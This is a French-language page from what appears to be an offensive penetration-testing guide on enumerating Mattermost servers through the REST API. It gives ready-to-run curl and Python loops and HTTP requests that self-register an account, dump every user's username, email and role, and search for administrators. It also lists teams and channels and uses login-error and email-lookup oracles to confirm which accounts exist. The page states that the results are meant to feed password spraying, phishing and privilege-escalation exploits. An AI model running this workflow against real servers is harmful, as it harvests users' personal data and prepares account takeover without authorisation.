---
title: "Énumération"
order: 1
description: "Moissonner un serveur Mattermost via l'API REST : parcourir /api/v4/users et /api/v4/users/search pour obtenir la liste complète des membres, lister /api/v4/teams et /api/v4/channels, confirmer l'existence d'un compte via /api/v4/users/email/{email} et les différences d'erreurs de connexion, et lire X-Version-Id pour cadrer l'exploitation ultérieure. Curl détaillé avec un jeton de session et interprétation du JSON."
keywords:
  - mattermost enumeration
  - api v4 users
  - users search
  - account existence
  - x-version-id
---

# Énumération

Mattermost effectue tout le travail d'annuaire via `/api/v4`, et l'autorisation sur ces points de terminaison de lecture est plus faible que ce que les opérateurs imaginent : tout utilisateur authentifié (y compris un utilisateur fraîchement auto-inscrit sur un serveur ouvert) peut parcourir toute la liste des utilisateurs et lister les équipes, et certains déploiements fuitent des données d'existence et de version sans aucun jeton. L'objectif ici est une cartographie complète des utilisateurs, équipes et salons plus une version cernée, alimentant le spraying et l'exploitation qui suivent.

## Prérequis

Vous avez besoin soit d'un serveur à inscription ouverte (créez un compte, ci-dessous), soit d'un seul jeton de session valide. Vérifiez l'inscription ouverte depuis la configuration client non authentifiée :

```bash
curl -sk 'http://<target>:8065/api/v4/config/client?format=old' \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print("open:",d.get("EnableOpenServer"),"signup:",d.get("EnableUserCreation"))'
```

Si `EnableUserCreation` est `true`, créez votre propre compte et jeton :

```http
POST /api/v4/users HTTP/1.1
Host: target:8065
Content-Type: application/json

{"email":"a@evil.test","username":"a1","password":"Sprayed-Passw0rd!"}
```

puis connectez-vous (voir [authentification](authentication.md)) pour obtenir un jeton Bearer pour tout ce qui suit.

## Parcourir la liste complète des utilisateurs

`GET /api/v4/users` renvoie la liste globale des utilisateurs, paginée avec `page`/`per_page` (max 200). Il n'y a pas de restriction « seulement mes équipes » sur le point de terminaison de base, donc une seule boucle vide tous les comptes :

```bash
TOK=<session-token>
for p in $(seq 0 50); do
  curl -sk -H "Authorization: Bearer $TOK" \
    "http://<target>:8065/api/v4/users?page=$p&per_page=200" > /tmp/u$p.json
  [ "$(python3 -c 'import json,sys;print(len(json.load(open("/tmp/u'$p'.json"))))')" = 0 ] && break
done
cat /tmp/u*.json | python3 -c 'import json,sys,glob
for f in glob.glob("/tmp/u*.json"):
  for u in json.load(open(f)): print(u["username"],u["email"],u.get("roles"))'
```

```text
admin        root@corp.test      system_admin system_user
j.doe        j.doe@corp.test     system_user
svc-deploy   deploy@corp.test    system_user
```

Lisez le champ `roles` : `system_admin` marque les comptes dignes d'être ciblés par spraying ou vol de jeton, car le statut system-admin est le prérequis de la RCE par upload de plugin dans l'[exploitation serveur](server-exploitation.md). Les valeurs `email` alimentent à la fois le spraying et le phishing externe.

`GET /api/v4/users/search` prend un corps JSON et apparie des termes partiels, utile pour trouver des schémas de nommage privilégiés sans tout parcourir :

```http
POST /api/v4/users/search HTTP/1.1
Host: target:8065
Authorization: Bearer <token>
Content-Type: application/json

{"term":"admin","allow_inactive":true,"limit":100}
```

## Équipes et salons

`GET /api/v4/teams` liste les équipes ; pour chaque identifiant d'équipe, `GET /api/v4/teams/{team_id}/channels` et la liste des salons publics exposent les noms de salons, et le comportement de `GET /api/v4/channels` varie selon la version. Les équipes désactivées ou privées dont le jeton n'est pas membre renvoient parfois quand même des métadonnées, ce qui est la moitié énumération de l'IDOR couvert dans l'[exploitation serveur](server-exploitation.md) :

```bash
curl -sk -H "Authorization: Bearer $TOK" http://<target>:8065/api/v4/teams | python3 -m json.tool | grep -E '"name"|"id"|"type"'
#   "type":"O"  open team (anyone can join)    "type":"I"  invite-only
```

Une équipe ouverte (`"type":"O"`) permet à votre compte peu privilégié de la rejoindre et de lire immédiatement l'historique de ses salons.

## Existence de compte sans session

Deux oracles sans jeton confirment si une adresse ou un nom donné est un compte réel, pour cadrer une liste de spray aux utilisateurs actifs :

```http
GET /api/v4/users/email/target.user@corp.test HTTP/1.1
Host: target:8065
```

Un `200` avec un objet utilisateur (ou un `403`/`401` qui diffère du `404` renvoyé pour une adresse inexistante) distingue les comptes réels des faux. Le point de terminaison de connexion donne le même oracle via son corps d'erreur : un mauvais mot de passe pour un compte réel renvoie `id":"api.user.check_user_password.invalid.app_error`, tandis qu'une connexion inconnue renvoie `api.user.login.invalid_credentials...`, vous permettant de séparer les noms d'utilisateur valides avant de faire du spraying.

## Suite

La liste (noms d'utilisateur, e-mails, drapeaux `system_admin`) alimente le password spraying dans l'[authentification](authentication.md) ; la carte des équipes et salons alimente les lectures IDOR inter-équipes dans l'[exploitation serveur](server-exploitation.md) ; et le `X-Version-Id` cerné décide quels paramètres d'injection SQL et quel comportement de signature de plugin s'appliquent.

## Outils

- [mattermost/mattermost (server source, to confirm endpoint auth checks per build)](https://github.com/mattermost/mattermost)
- `jq` ou une courte boucle Python pour parcourir et analyser le JSON des utilisateurs.

## Références

- [Mattermost API: users endpoints](https://api.mattermost.com/#tag/users)
- [Mattermost API: teams and channels](https://api.mattermost.com/#tag/teams)
- [HackTricks: pentesting network services](https://book.hacktricks.wiki/en/network-services-pentesting/index.html)
